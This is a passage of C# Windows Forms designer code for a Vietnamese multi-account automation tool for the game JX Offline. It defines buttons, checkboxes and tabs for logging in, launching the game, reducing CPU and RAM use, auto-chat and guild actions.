		this.linkLabelTrangchu.TabStop = true;
		this.linkLabelTrangchu.Text = "( mở trang web)";
		this.linkLabelTrangchu.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabelTrangchu_LinkClicked);
		this.checkBoxChayRunAdmin.AutoSize = true;
		this.checkBoxChayRunAdmin.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxChayRunAdmin.ForeColor = System.Drawing.Color.Red;
		this.checkBoxChayRunAdmin.Location = new System.Drawing.Point(3, 192);
		this.checkBoxChayRunAdmin.Name = "checkBoxChayRunAdmin";
		this.checkBoxChayRunAdmin.Size = new System.Drawing.Size(160, 17);
		this.checkBoxChayRunAdmin.TabIndex = 173;
		this.checkBoxChayRunAdmin.Text = "Auto luôn chạy run as admin";
		this.checkBoxChayRunAdmin.UseVisualStyleBackColor = true;
		this.checkBoxChayRunAdmin.CheckedChanged += new System.EventHandler(checkBoxChayRunAdmin_CheckedChanged);
		this.buttonTuTimWeb.ForeColor = System.Drawing.Color.Black;
		this.buttonTuTimWeb.Location = new System.Drawing.Point(196, 126);
		this.buttonTuTimWeb.Name = "buttonTuTimWeb";
		this.buttonTuTimWeb.Size = new System.Drawing.Size(60, 21);
		this.buttonTuTimWeb.TabIndex = 172;
		this.buttonTuTimWeb.Text = "Tìm Web";
		this.buttonTuTimWeb.UseVisualStyleBackColor = true;
		this.buttonTuTimWeb.Click += new System.EventHandler(buttonTuTimWeb_Click);
		this.checkBoxGameHu.AutoSize = true;
		this.checkBoxGameHu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxGameHu.ForeColor = System.Drawing.Color.Red;
		this.checkBoxGameHu.Location = new System.Drawing.Point(3, 210);
		this.checkBoxGameHu.Name = "checkBoxGameHu";
		this.checkBoxGameHu.Size = new System.Drawing.Size(160, 17);
		this.checkBoxGameHu.TabIndex = 168;
		this.checkBoxGameHu.Text = "Loại bỏ game hư chạy ngầm";
		this.checkBoxGameHu.UseVisualStyleBackColor = true;
		this.checkBoxGameHu.CheckedChanged += new System.EventHandler(checkBoxGameHu_CheckedChanged);
		this.checkBoxGiamRamTudong.AutoSize = true;
		this.checkBoxGiamRamTudong.ForeColor = System.Drawing.Color.Red;
		this.checkBoxGiamRamTudong.Location = new System.Drawing.Point(170, 192);
		this.checkBoxGiamRamTudong.Name = "checkBoxGiamRamTudong";
		this.checkBoxGiamRamTudong.Size = new System.Drawing.Size(81, 19);
		this.checkBoxGiamRamTudong.TabIndex = 160;
		this.checkBoxGiamRamTudong.Text = "Giảm ram";
		this.checkBoxGiamRamTudong.UseVisualStyleBackColor = true;
		this.checkBoxGiamRamTudong.CheckedChanged += new System.EventHandler(checkBoxGiamRamTudong_CheckedChanged);
		this.comboBoxGameOfWeb.BackColor = System.Drawing.Color.White;
		this.comboBoxGameOfWeb.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxGameOfWeb.DropDownWidth = 260;
		this.comboBoxGameOfWeb.ForeColor = System.Drawing.Color.Black;
		this.comboBoxGameOfWeb.FormattingEnabled = true;
		this.comboBoxGameOfWeb.Location = new System.Drawing.Point(4, 125);
		this.comboBoxGameOfWeb.Name = "comboBoxGameOfWeb";
		this.comboBoxGameOfWeb.Size = new System.Drawing.Size(190, 23);
		this.comboBoxGameOfWeb.TabIndex = 143;
		this.comboBoxGameOfWeb.SelectedIndexChanged += new System.EventHandler(comboBoxGameOfWeb_SelectedIndexChanged);
		this.buttonFixGameTuthoat.ForeColor = System.Drawing.Color.Green;
		this.buttonFixGameTuthoat.Location = new System.Drawing.Point(260, 133);
		this.buttonFixGameTuthoat.Name = "buttonFixGameTuthoat";
		this.buttonFixGameTuthoat.Size = new System.Drawing.Size(126, 51);
		this.buttonFixGameTuthoat.TabIndex = 142;
		this.buttonFixGameTuthoat.Text = "Fix lỗi cash diss game";
		this.buttonFixGameTuthoat.UseVisualStyleBackColor = true;
		this.buttonFixGameTuthoat.Click += new System.EventHandler(buttonFixGameTuthoat_Click);
		this.tabControl2.Controls.Add(this.tabPage14);
		this.tabControl2.Controls.Add(this.tabPage3);
		this.tabControl2.Location = new System.Drawing.Point(3, 1);
		this.tabControl2.Margin = new System.Windows.Forms.Padding(0);
		this.tabControl2.Name = "tabControl2";
		this.tabControl2.SelectedIndex = 0;
		this.tabControl2.Size = new System.Drawing.Size(260, 106);
		this.tabControl2.TabIndex = 163;
		this.tabPage14.Controls.Add(this.richTextBoxBHO);
		this.tabPage14.Location = new System.Drawing.Point(4, 24);
		this.tabPage14.Name = "tabPage14";
		this.tabPage14.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage14.Size = new System.Drawing.Size(252, 78);
		this.tabPage14.TabIndex = 0;
		this.tabPage14.Text = "Thông Tin Auto";
		this.tabPage14.UseVisualStyleBackColor = true;
		this.richTextBoxBHO.Location = new System.Drawing.Point(1, 1);
		this.richTextBoxBHO.Name = "richTextBoxBHO";
		this.richTextBoxBHO.ReadOnly = true;
		this.richTextBoxBHO.Size = new System.Drawing.Size(249, 73);
		this.richTextBoxBHO.TabIndex = 142;
		this.richTextBoxBHO.Text = "Auto Free 100% cho JX Offline by MEL";
		this.tabPage3.Controls.Add(this.checkBoxThu);
		this.tabPage3.Location = new System.Drawing.Point(4, 24);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage3.Size = new System.Drawing.Size(252, 78);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Khác";
		this.tabPage3.UseVisualStyleBackColor = true;
		this.tabPage3.Click += new System.EventHandler(tabPage3_Click);
		this.checkBoxThu.AutoSize = true;
		this.checkBoxThu.Location = new System.Drawing.Point(4, 5);
		this.checkBoxThu.Name = "checkBoxThu";
		this.checkBoxThu.Size = new System.Drawing.Size(256, 19);
		this.checkBoxThu.TabIndex = 0;
		this.checkBoxThu.Text = "Thu nhỏ auto vào taskbar (dạng minimize)";
		this.checkBoxThu.UseVisualStyleBackColor = true;
		this.checkBoxThu.CheckedChanged += new System.EventHandler(checkBoxThu_CheckedChanged);
		this.textBoxChatNham.ForeColor = System.Drawing.Color.Black;
		this.textBoxChatNham.Location = new System.Drawing.Point(3, 266);
		this.textBoxChatNham.Name = "textBoxChatNham";
		this.textBoxChatNham.Size = new System.Drawing.Size(251, 21);
		this.textBoxChatNham.TabIndex = 158;
		this.textBoxChatNham.Text = "chát nhảm ";
		this.textBoxChatNham.TextChanged += new System.EventHandler(textBoxChatNham_TextChanged);
		this.textBoxThuMuc.BackColor = System.Drawing.SystemColors.Control;
		this.textBoxThuMuc.ForeColor = System.Drawing.Color.Black;
		this.textBoxThuMuc.Location = new System.Drawing.Point(4, 167);
		this.textBoxThuMuc.Name = "textBoxThuMuc";
		this.textBoxThuMuc.ReadOnly = true;
		this.textBoxThuMuc.ScrollBars = System.Windows.Forms.ScrollBars.Horizontal;
		this.textBoxThuMuc.Size = new System.Drawing.Size(190, 21);
		this.textBoxThuMuc.TabIndex = 31;
		this.textBoxThuMuc.WordWrap = false;
		this.checkBoxChatNham.AutoSize = true;
		this.checkBoxChatNham.ForeColor = System.Drawing.Color.Black;
		this.checkBoxChatNham.Location = new System.Drawing.Point(169, 230);
		this.checkBoxChatNham.Name = "checkBoxChatNham";
		this.checkBoxChatNham.Size = new System.Drawing.Size(86, 19);
		this.checkBoxChatNham.TabIndex = 159;
		this.checkBoxChatNham.Text = "Chat nhảm";
		this.checkBoxChatNham.UseVisualStyleBackColor = true;
		this.checkBoxChatNham.CheckedChanged += new System.EventHandler(checkBoxChatNham_CheckedChanged);
		this.buttonBrowseGame.ForeColor = System.Drawing.Color.Black;
		this.buttonBrowseGame.Location = new System.Drawing.Point(196, 166);
		this.buttonBrowseGame.Name = "buttonBrowseGame";
		this.buttonBrowseGame.Size = new System.Drawing.Size(60, 21);
		this.buttonBrowseGame.TabIndex = 32;
		this.buttonBrowseGame.Text = "browse";
		this.buttonBrowseGame.UseVisualStyleBackColor = true;
		this.buttonBrowseGame.Click += new System.EventHandler(buttonBrowseGame_Click);
		this.buttonThumucAuto.ForeColor = System.Drawing.Color.Black;
		this.buttonThumucAuto.Location = new System.Drawing.Point(260, 186);
		this.buttonThumucAuto.Name = "buttonThumucAuto";
		this.buttonThumucAuto.Size = new System.Drawing.Size(126, 50);
		this.buttonThumucAuto.TabIndex = 26;
		this.buttonThumucAuto.Text = "Thư mục auto";
		this.buttonThumucAuto.UseVisualStyleBackColor = true;
		this.buttonThumucAuto.Click += new System.EventHandler(buttonThumucAuto_Click);
		this.label1.AutoSize = true;
		this.label1.BackColor = System.Drawing.SystemColors.Control;
		this.label1.ForeColor = System.Drawing.Color.Black;
		this.label1.Location = new System.Drawing.Point(1, 149);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(168, 15);
		this.label1.TabIndex = 35;
		this.label1.Text = "2. Chọn thư mục và file game:";
		this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.buttonToShortcut.ForeColor = System.Drawing.Color.Black;
		this.buttonToShortcut.Location = new System.Drawing.Point(260, 238);
		this.buttonToShortcut.Name = "buttonToShortcut";
		this.buttonToShortcut.Size = new System.Drawing.Size(126, 48);
		this.buttonToShortcut.TabIndex = 27;
		this.buttonToShortcut.Text = "Tạo shortcut lên desktop";
		this.buttonToShortcut.UseVisualStyleBackColor = true;
		this.buttonToShortcut.Click += new System.EventHandler(buttonToShortcut_Click);
		this.label6.AutoSize = true;
		this.label6.BackColor = System.Drawing.SystemColors.Control;
		this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.label6.ForeColor = System.Drawing.Color.Black;
		this.label6.Location = new System.Drawing.Point(1, 107);
		this.label6.Name = "label6";
		this.label6.Size = new System.Drawing.Size(168, 13);
		this.label6.TabIndex = 142;
		this.label6.Text = "1. Chọn web của game đang chơi";
		this.tabPage9.Controls.Add(this.tabControlPhutro);
		this.tabPage9.Location = new System.Drawing.Point(4, 30);
		this.tabPage9.Name = "tabPage9";
		this.tabPage9.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage9.Size = new System.Drawing.Size(391, 290);
		this.tabPage9.TabIndex = 5;
		this.tabPage9.Text = "Phụ trợ";
		this.tabPage9.UseVisualStyleBackColor = true;
		this.tabControlPhutro.Controls.Add(this.tabPage4);
		this.tabControlPhutro.Controls.Add(this.tabPageTinsu);
		this.tabControlPhutro.Controls.Add(this.tabPageTinhLuyen);
		this.tabControlPhutro.Controls.Add(this.tabPage8);
		this.tabControlPhutro.Controls.Add(this.tabPage10);
		this.tabControlPhutro.Controls.Add(this.tabPageTest);
		this.tabControlPhutro.Location = new System.Drawing.Point(0, 0);
		this.tabControlPhutro.Margin = new System.Windows.Forms.Padding(0);
		this.tabControlPhutro.Name = "tabControlPhutro";
		this.tabControlPhutro.SelectedIndex = 0;
		this.tabControlPhutro.Size = new System.Drawing.Size(390, 290);
		this.tabControlPhutro.TabIndex = 172;
		this.tabPage4.Controls.Add(this.buttonDongtien);
		this.tabPage4.Controls.Add(this.buttonPhimTat);
		this.tabPage4.Controls.Add(this.checkBoxPhimTat);
		this.tabPage4.Controls.Add(this.buttonGiamCPUAll);
		this.tabPage4.Controls.Add(this.comboBoxGiamCpu);
		this.tabPage4.Controls.Add(this.buttonAnhet);
		this.tabPage4.Controls.Add(this.buttonThoatHetgame);
		this.tabPage4.Controls.Add(this.button1);
		this.tabPage4.Controls.Add(this.buttonThoatGame);
		this.tabPage4.Controls.Add(this.buttonBatGiaodichAll);
		this.tabPage4.Controls.Add(this.buttonTC);
		this.tabPage4.Controls.Add(this.buttonTudoiMaubang);
		this.tabPage4.Controls.Add(this.buttonDocCauhinh);
		this.tabPage4.Controls.Add(this.buttonTangdiem);
		this.tabPage4.Controls.Add(this.buttonLuuCauhinhAll);
		this.tabPage4.Controls.Add(this.buttonVaotraiStopAll);
		this.tabPage4.Controls.Add(this.buttonNopLenhbaiAll);
		this.tabPage4.Controls.Add(this.buttonVaotraiStop);
		this.tabPage4.Controls.Add(this.comboBoxBentau);
		this.tabPage4.Controls.Add(this.buttonNopLenhbai);
		this.tabPage4.Controls.Add(this.buttonMoGame);
		this.tabPage4.Controls.Add(this.buttonLogin);
		this.tabPage4.Controls.Add(this.buttonDanhsachCuusat);
		this.tabPage4.Controls.Add(this.label29);
		this.tabPage4.Controls.Add(this.comboBoxAccDoiMau);
		this.tabPage4.Controls.Add(this.buttonHuongdanHLP);
		this.tabPage4.Controls.Add(this.buttonCapnhat);
		this.tabPage4.Location = new System.Drawing.Point(4, 24);
		this.tabPage4.Name = "tabPage4";
		this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage4.Size = new System.Drawing.Size(382, 262);
		this.tabPage4.TabIndex = 0;
		this.tabPage4.Text = "Chung 1";
		this.tabPage4.UseVisualStyleBackColor = true;
		this.buttonDongtien.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonDongtien.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonDongtien.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonDongtien.ForeColor = System.Drawing.Color.Black;
		this.buttonDongtien.Location = new System.Drawing.Point(275, 217);
		this.buttonDongtien.Name = "buttonDongtien";
		this.buttonDongtien.Size = new System.Drawing.Size(102, 36);
		this.buttonDongtien.TabIndex = 350;
		this.buttonDongtien.Text = "Gửi tiền lên bang";
		this.buttonDongtien.UseVisualStyleBackColor = false;
		this.buttonDongtien.Click += new System.EventHandler(buttonDongtien_Click);
		this.buttonPhimTat.ForeColor = System.Drawing.Color.Black;
		this.buttonPhimTat.Location = new System.Drawing.Point(195, 232);
		this.buttonPhimTat.Name = "buttonPhimTat";
		this.buttonPhimTat.Size = new System.Drawing.Size(75, 23);
		this.buttonPhimTat.TabIndex = 339;
		this.buttonPhimTat.Text = "Phím tắt";
		this.buttonPhimTat.UseVisualStyleBackColor = true;
		this.buttonPhimTat.Click += new System.EventHandler(buttonPhimTat_Click);
		this.checkBoxPhimTat.AutoSize = true;
		this.checkBoxPhimTat.CheckAlign = System.Drawing.ContentAlignment.TopLeft;
		this.checkBoxPhimTat.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.checkBoxPhimTat.ForeColor = System.Drawing.Color.DarkRed;
		this.checkBoxPhimTat.Location = new System.Drawing.Point(97, 236);
		this.checkBoxPhimTat.Name = "checkBoxPhimTat";
		this.checkBoxPhimTat.Size = new System.Drawing.Size(92, 17);
		this.checkBoxPhimTat.TabIndex = 154;
		this.checkBoxPhimTat.Text = "Phím tắt =>";
		this.checkBoxPhimTat.UseVisualStyleBackColor = true;
		this.checkBoxPhimTat.CheckedChanged += new System.EventHandler(checkBoxPhimTat_CheckedChanged);
		this.buttonGiamCPUAll.ForeColor = System.Drawing.Color.Black;
		this.buttonGiamCPUAll.Location = new System.Drawing.Point(96, 200);
		this.buttonGiamCPUAll.Name = "buttonGiamCPUAll";
		this.buttonGiamCPUAll.Size = new System.Drawing.Size(174, 26);
		this.buttonGiamCPUAll.TabIndex = 200;
		this.buttonGiamCPUAll.Text = "Áp dụng tất cả ac (phím F10)";
		this.buttonGiamCPUAll.UseVisualStyleBackColor = true;
		this.buttonGiamCPUAll.Click += new System.EventHandler(buttonGiamCPUAll_Click);
		this.comboBoxGiamCpu.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxGiamCpu.DropDownWidth = 230;
		this.comboBoxGiamCpu.ForeColor = System.Drawing.Color.Black;
		this.comboBoxGiamCpu.FormattingEnabled = true;
		this.comboBoxGiamCpu.Location = new System.Drawing.Point(97, 175);
		this.comboBoxGiamCpu.Name = "comboBoxGiamCpu";
		this.comboBoxGiamCpu.Size = new System.Drawing.Size(173, 23);
		this.comboBoxGiamCpu.TabIndex = 199;
		this.comboBoxGiamCpu.SelectedIndexChanged += new System.EventHandler(comboBoxGiamCpu_SelectedIndexChanged);
		this.buttonAnhet.BackColor = System.Drawing.Color.DarkSeaGreen;
		this.buttonAnhet.ForeColor = System.Drawing.Color.Maroon;
		this.buttonAnhet.Location = new System.Drawing.Point(3, 108);
		this.buttonAnhet.Name = "buttonAnhet";
		this.buttonAnhet.Size = new System.Drawing.Size(92, 47);
		this.buttonAnhet.TabIndex = 198;
		this.buttonAnhet.Text = "Ẩn hết";
		this.buttonAnhet.UseVisualStyleBackColor = false;
		this.buttonAnhet.Click += new System.EventHandler(buttonAnhet_Click);
		this.buttonThoatHetgame.BackColor = System.Drawing.Color.MintCream;
		this.buttonThoatHetgame.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonThoatHetgame.ForeColor = System.Drawing.Color.Black;
		this.buttonThoatHetgame.Location = new System.Drawing.Point(3, 189);
		this.buttonThoatHetgame.Name = "buttonThoatHetgame";
		this.buttonThoatHetgame.Size = new System.Drawing.Size(92, 31);
		this.buttonThoatHetgame.TabIndex = 202;
		this.buttonThoatHetgame.Text = "Thoát hết game";
		this.buttonThoatHetgame.UseVisualStyleBackColor = false;
		this.buttonThoatHetgame.Click += new System.EventHandler(buttonThoatHetgame_Click);
		this.button1.ForeColor = System.Drawing.Color.Black;
		this.button1.Location = new System.Drawing.Point(96, 146);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(97, 26);
		this.button1.TabIndex = 349;
		this.button1.Text = "Danh sách =>";
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(button1_Click);
		this.buttonThoatGame.BackColor = System.Drawing.Color.Honeydew;
		this.buttonThoatGame.ForeColor = System.Drawing.Color.Red;
		this.buttonThoatGame.Location = new System.Drawing.Point(3, 155);
		this.buttonThoatGame.Name = "buttonThoatGame";
		this.buttonThoatGame.Size = new System.Drawing.Size(92, 34);
		this.buttonThoatGame.TabIndex = 343;
		this.buttonThoatGame.Text = "Thoát";
		this.buttonThoatGame.UseVisualStyleBackColor = false;
		this.buttonThoatGame.Click += new System.EventHandler(buttonThoatGame_Click);
		this.buttonBatGiaodichAll.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonBatGiaodichAll.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonBatGiaodichAll.ForeColor = System.Drawing.Color.Black;
		this.buttonBatGiaodichAll.Location = new System.Drawing.Point(275, 178);
		this.buttonBatGiaodichAll.Name = "buttonBatGiaodichAll";
		this.buttonBatGiaodichAll.Size = new System.Drawing.Size(102, 38);
		this.buttonBatGiaodichAll.TabIndex = 346;
		this.buttonBatGiaodichAll.Text = "Bật giao dịch tất cả acc";
		this.buttonBatGiaodichAll.UseVisualStyleBackColor = false;
		this.buttonBatGiaodichAll.Click += new System.EventHandler(buttonBatGiaodichAll_Click);
		this.buttonTC.ForeColor = System.Drawing.Color.Red;
		this.buttonTC.Location = new System.Drawing.Point(196, 146);
		this.buttonTC.Name = "buttonTC";
		this.buttonTC.Size = new System.Drawing.Size(75, 26);
		this.buttonTC.TabIndex = 348;
		this.buttonTC.Text = "Tuyên chiến";
		this.buttonTC.UseVisualStyleBackColor = true;
		this.buttonTC.Click += new System.EventHandler(buttonTC_Click);
		this.buttonTudoiMaubang.ForeColor = System.Drawing.Color.Red;
		this.buttonTudoiMaubang.Location = new System.Drawing.Point(196, 118);
		this.buttonTudoiMaubang.Name = "buttonTudoiMaubang";
		this.buttonTudoiMaubang.Size = new System.Drawing.Size(75, 25);
		this.buttonTudoiMaubang.TabIndex = 345;
		this.buttonTudoiMaubang.Text = "Tự động";
		this.buttonTudoiMaubang.UseVisualStyleBackColor = true;
		this.buttonTudoiMaubang.Click += new System.EventHandler(buttonTudoiMaubang_Click);
		this.buttonDocCauhinh.ForeColor = System.Drawing.Color.Black;
		this.buttonDocCauhinh.Location = new System.Drawing.Point(274, 137);
		this.buttonDocCauhinh.Name = "buttonDocCauhinh";
		this.buttonDocCauhinh.Size = new System.Drawing.Size(103, 38);
		this.buttonDocCauhinh.TabIndex = 340;
		this.buttonDocCauhinh.Text = "Đọc cấu hình ac";
		this.buttonDocCauhinh.UseVisualStyleBackColor = true;
		this.buttonDocCauhinh.Click += new System.EventHandler(buttonDocCauhinh_Click);
		this.buttonTangdiem.BackColor = System.Drawing.SystemColors.Control;
		this.buttonTangdiem.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonTangdiem.ForeColor = System.Drawing.Color.Black;
		this.buttonTangdiem.Location = new System.Drawing.Point(275, 55);
		this.buttonTangdiem.Name = "buttonTangdiem";
		this.buttonTangdiem.Size = new System.Drawing.Size(102, 38);
		this.buttonTangdiem.TabIndex = 344;
		this.buttonTangdiem.Text = "Tăng điểm nhanh";
		this.buttonTangdiem.UseVisualStyleBackColor = false;
		this.buttonTangdiem.Click += new System.EventHandler(buttonTangdiem_Click);
		this.buttonLuuCauhinhAll.ForeColor = System.Drawing.Color.Black;
		this.buttonLuuCauhinhAll.Location = new System.Drawing.Point(275, 96);
		this.buttonLuuCauhinhAll.Name = "buttonLuuCauhinhAll";
		this.buttonLuuCauhinhAll.Size = new System.Drawing.Size(102, 38);
		this.buttonLuuCauhinhAll.TabIndex = 320;
		this.buttonLuuCauhinhAll.Text = "Lưu cấu hình";
		this.buttonLuuCauhinhAll.UseVisualStyleBackColor = true;
		this.buttonLuuCauhinhAll.Click += new System.EventHandler(buttonLuuCauhinhAll_Click);
		this.buttonVaotraiStopAll.ForeColor = System.Drawing.Color.Blue;
		this.buttonVaotraiStopAll.Location = new System.Drawing.Point(196, 68);
		this.buttonVaotraiStopAll.Name = "buttonVaotraiStopAll";
		this.buttonVaotraiStopAll.Size = new System.Drawing.Size(75, 31);
		this.buttonVaotraiStopAll.TabIndex = 162;
		this.buttonVaotraiStopAll.Text = "Dừng tất cả";
		this.buttonVaotraiStopAll.UseVisualStyleBackColor = true;
		this.buttonVaotraiStopAll.Click += new System.EventHandler(buttonVaotraiStopAll_Click);
		this.buttonNopLenhbaiAll.ForeColor = System.Drawing.Color.Red;
		this.buttonNopLenhbaiAll.Location = new System.Drawing.Point(97, 68);
		this.buttonNopLenhbaiAll.Name = "buttonNopLenhbaiAll";
		this.buttonNopLenhbaiAll.Size = new System.Drawing.Size(95, 31);
		this.buttonNopLenhbaiAll.TabIndex = 146;
		this.buttonNopLenhbaiAll.Text = "Tất cả ac";
		this.buttonNopLenhbaiAll.UseVisualStyleBackColor = true;
		this.buttonNopLenhbaiAll.Click += new System.EventHandler(buttonNopLenhbaiAll_Click);
		this.buttonVaotraiStop.ForeColor = System.Drawing.Color.Black;
		this.buttonVaotraiStop.Location = new System.Drawing.Point(196, 36);
		this.buttonVaotraiStop.Name = "buttonVaotraiStop";
		this.buttonVaotraiStop.Size = new System.Drawing.Size(75, 30);
		this.buttonVaotraiStop.TabIndex = 161;
		this.buttonVaotraiStop.Text = "Dừng";
		this.buttonVaotraiStop.UseVisualStyleBackColor = true;
		this.buttonVaotraiStop.Click += new System.EventHandler(buttonVaotraiStop_Click);
		this.comboBoxBentau.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxBentau.DropDownWidth = 180;
		this.comboBoxBentau.ForeColor = System.Drawing.Color.Black;
		this.comboBoxBentau.FormattingEnabled = true;
		this.comboBoxBentau.Location = new System.Drawing.Point(98, 9);
		this.comboBoxBentau.Name = "comboBoxBentau";
		this.comboBoxBentau.Size = new System.Drawing.Size(172, 23);
		this.comboBoxBentau.TabIndex = 133;
		this.comboBoxBentau.SelectedIndexChanged += new System.EventHandler(comboBoxBentau_SelectedIndexChanged);
		this.buttonNopLenhbai.ForeColor = System.Drawing.Color.Black;
		this.buttonNopLenhbai.Location = new System.Drawing.Point(97, 36);
		this.buttonNopLenhbai.Name = "buttonNopLenhbai";
		this.buttonNopLenhbai.Size = new System.Drawing.Size(95, 30);
		this.buttonNopLenhbai.TabIndex = 144;
		this.buttonNopLenhbai.Text = "Thực thi lệnh";
		this.buttonNopLenhbai.UseVisualStyleBackColor = true;
		this.buttonNopLenhbai.Click += new System.EventHandler(buttonNopLenhbai_Click);
		this.buttonMoGame.BackColor = System.Drawing.SystemColors.Control;
		this.buttonMoGame.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonMoGame.ForeColor = System.Drawing.Color.Blue;
		this.buttonMoGame.Location = new System.Drawing.Point(3, 52);
		this.buttonMoGame.Name = "buttonMoGame";
		this.buttonMoGame.Size = new System.Drawing.Size(92, 29);
		this.buttonMoGame.TabIndex = 197;
		this.buttonMoGame.Text = "Mở game";
		this.buttonMoGame.UseVisualStyleBackColor = false;
		this.buttonMoGame.Click += new System.EventHandler(buttonMoGame_Click);
		this.buttonLogin.BackColor = System.Drawing.Color.CornflowerBlue;
		this.buttonLogin.ForeColor = System.Drawing.Color.Red;
		this.buttonLogin.Location = new System.Drawing.Point(3, 5);
		this.buttonLogin.Name = "buttonLogin";
		this.buttonLogin.Size = new System.Drawing.Size(92, 46);
		this.buttonLogin.TabIndex = 138;
		this.buttonLogin.Text = "Login";
		this.buttonLogin.UseVisualStyleBackColor = false;
		this.buttonLogin.Click += new System.EventHandler(buttonLogin_Click);
		this.buttonDanhsachCuusat.BackColor = System.Drawing.Color.HotPink;
		this.buttonDanhsachCuusat.ForeColor = System.Drawing.Color.LavenderBlush;
		this.buttonDanhsachCuusat.Location = new System.Drawing.Point(3, 79);
		this.buttonDanhsachCuusat.Name = "buttonDanhsachCuusat";
		this.buttonDanhsachCuusat.Size = new System.Drawing.Size(92, 34);
		this.buttonDanhsachCuusat.TabIndex = 319;
		this.buttonDanhsachCuusat.Text = "Cừu sát";
		this.buttonDanhsachCuusat.UseVisualStyleBackColor = false;
		this.buttonDanhsachCuusat.Click += new System.EventHandler(buttonDanhsachCuusat_Click);
		this.label29.AutoSize = true;
		this.label29.Location = new System.Drawing.Point(104, 102);
		this.label29.Name = "label29";
		this.label29.Size = new System.Drawing.Size(172, 15);
		this.label29.TabIndex = 201;
		this.label29.Text = "Ac đổi màu (3 nút VXT bảng 1)";
		this.comboBoxAccDoiMau.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxAccDoiMau.DropDownWidth = 110;
		this.comboBoxAccDoiMau.ForeColor = System.Drawing.Color.Black;
		this.comboBoxAccDoiMau.FormattingEnabled = true;
		this.comboBoxAccDoiMau.Location = new System.Drawing.Point(96, 120);
		this.comboBoxAccDoiMau.Name = "comboBoxAccDoiMau";
		this.comboBoxAccDoiMau.Size = new System.Drawing.Size(97, 23);
		this.comboBoxAccDoiMau.TabIndex = 133;
		this.comboBoxAccDoiMau.SelectedIndexChanged += new System.EventHandler(comboBoxAccDoiMau_SelectedIndexChanged);
		this.comboBoxAccDoiMau.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxAccDoiMau_MouseDown);
		this.buttonHuongdanHLP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonHuongdanHLP.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonHuongdanHLP.Location = new System.Drawing.Point(3, 219);
		this.buttonHuongdanHLP.Name = "buttonHuongdanHLP";
		this.buttonHuongdanHLP.Size = new System.Drawing.Size(92, 36);
		this.buttonHuongdanHLP.TabIndex = 171;
		this.buttonHuongdanHLP.Text = "Phim hướng dẫn chung";
		this.buttonHuongdanHLP.UseVisualStyleBackColor = true;
		this.buttonHuongdanHLP.Click += new System.EventHandler(buttonHuongdanHLP_Click);
		this.buttonCapnhat.Enabled = false;
		this.buttonCapnhat.ForeColor = System.Drawing.Color.Black;
		this.buttonCapnhat.Location = new System.Drawing.Point(275, 4);
		this.buttonCapnhat.Name = "buttonCapnhat";
		this.buttonCapnhat.Size = new System.Drawing.Size(102, 47);
		this.buttonCapnhat.TabIndex = 136;
		this.buttonCapnhat.Text = "Cập nhật auto";
		this.buttonCapnhat.UseVisualStyleBackColor = true;
		this.buttonCapnhat.Click += new System.EventHandler(buttonCapnhat_Click);
		this.tabPageTinsu.Controls.Add(this.buttonHuyenTinh);
		this.tabPageTinsu.Controls.Add(this.buttonRaovat);
		this.tabPageTinsu.Controls.Add(this.groupBox6);
		this.tabPageTinsu.Controls.Add(this.groupBox4);
		this.tabPageTinsu.Location = new System.Drawing.Point(4, 24);
		this.tabPageTinsu.Name = "tabPageTinsu";
		this.tabPageTinsu.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageTinsu.Size = new System.Drawing.Size(382, 262);
		this.tabPageTinsu.TabIndex = 1;
		this.tabPageTinsu.Text = "Chung 2";
		this.tabPageTinsu.UseVisualStyleBackColor = true;
		this.buttonHuyenTinh.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonHuyenTinh.ForeColor = System.Drawing.Color.Black;
		this.buttonHuyenTinh.Location = new System.Drawing.Point(121, 186);
		this.buttonHuyenTinh.Name = "buttonHuyenTinh";
		this.buttonHuyenTinh.Size = new System.Drawing.Size(124, 67);
		this.buttonHuyenTinh.TabIndex = 204;
		this.buttonHuyenTinh.Text = "Chể tạo Huyền tinh";
		this.buttonHuyenTinh.UseVisualStyleBackColor = false;
		this.buttonHuyenTinh.Click += new System.EventHandler(buttonHuyenTinh_Click);
		this.buttonRaovat.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonRaovat.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonRaovat.ForeColor = System.Drawing.Color.Black;
		this.buttonRaovat.Location = new System.Drawing.Point(4, 186);
		this.buttonRaovat.Name = "buttonRaovat";
		this.buttonRaovat.Size = new System.Drawing.Size(113, 66);
